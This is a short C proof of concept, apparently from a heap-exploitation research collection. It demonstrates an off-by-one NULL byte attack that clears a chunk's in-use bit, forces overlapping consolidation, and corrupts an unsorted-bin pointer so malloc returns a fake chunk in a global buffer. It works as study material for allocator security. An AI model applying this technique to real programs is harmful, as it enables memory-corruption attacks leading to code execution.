#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>

#include "malloc-lib.h"

uintptr_t buf[4];

int main() {
  int sz = 0x100 - 8;

  // [PRE-CONDITION]
  //    sz: small bin size
  //    assert(chunk_size(sz) & 0xff == 0);
  // [BUG] off-by-one NULL
  // [POST-CONDITION]
  //    assert(raw_to_chunk(malloc(sz)) == fake);

  // the lowest byte of chunk_size(sz) needs to be zero
  // to avoid chaning its size when triggering a bug
  // assert(chunk_size(sz) & 0xff == 0);
  char *p1 = malloc(sz);
  char *p2 = malloc(sz);
  char *p3 = malloc(sz);
  char *p4 = malloc(sz);

  // move p1 to unsorted bin
  free(p1);

  struct malloc_chunk* c3 = raw_to_chunk(p3);
  // make prev_size into double to cover a large chunk
  // this is valid by writing p2's last data
  c3->prev_size = chunk_size(sz) * 2;
  // [BUG] use off-by-one NULL to make P=0 in c3
  assert((c3->size & 0xff) == 0x01);
  c3->size &= ~1;

  // this will merge p1 & p3
  free(p3);

  // if we allocate p5, p2 is now points to a free chunk in the unsorted bin
  char *p5 = malloc(sz);

  // it's unsorted bin into stack
  struct malloc_chunk* fake = (void*)buf;
  // set fake->size to chunk_size(sz) for later allocation
  fake->size = chunk_size(sz);
  // set fake->bk to any writable address to avoid crash
  fake->bk = (void*)buf;

  struct malloc_chunk* c2 = raw_to_chunk(p2);
  c2->bk = fake;

  assert(raw_to_chunk(malloc(sz)) == fake);
}
